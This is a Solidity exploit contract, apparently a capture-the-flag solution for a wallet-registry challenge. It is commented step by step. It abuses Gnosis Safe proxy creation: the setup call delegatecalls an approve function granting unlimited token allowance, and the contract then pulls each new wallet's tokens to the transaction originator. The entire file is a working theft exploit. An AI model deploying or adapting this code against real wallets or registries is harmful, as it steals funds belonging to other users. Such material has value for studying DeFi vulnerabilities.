// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { WalletRegistry } from "./WalletRegistry.sol";
import { Enum } from "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackBackdoor {
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    IERC20 token;

    constructor(
        GnosisSafe _masterCopy,
        GnosisSafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        IERC20 _token
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        token = _token;
    }
    
    // This function it's going to be called by proxy through the masterCopy function called setup
    // This way, the proxy is going to approve the spender (this contract) to spend all the tokens
    function approve(address _token, address spender) external {
        IERC20(_token).approve(spender, type(uint256).max);
    }

    function hack(address[] memory beneficiaries) public {
        // Encode the callback to the approve function of this contract
        // passing the token address and this contract address as parameters
        // This is because, the function is going to be called throught delegatecall
        bytes memory encodedCallback = abi.encodeWithSignature(
            "approve(address,address)",
            address(token),
            address(this)
        );
        for (uint i = 0; i < beneficiaries.length; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];
            // This data we're encoding, is going to call the setup function inside the masterCopy
            // The beneficiary must be the owner in order to the walletProxy to receive the tokens
            // Pass the encodedCallback to approve
            bytes memory data = abi.encodeWithSelector(
                masterCopy.setup.selector,
                beneficiary,
                1,
                address(this),
                encodedCallback,
                address(0),
                address(0),
                0,
                address(0)
            );

            // We're going to create a proxy with a callback
            // This callback it's going to execute the function proxyCreated inside the walletRegistry
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                data,
                1,
                walletRegistry
            );

            // Once the proxyWallet was created, and the approve function was called thought delegate
            // We're going to transfer the player the tokens balance
            token.transferFrom(address(proxy), tx.origin, 10 ether);
        }
    }

}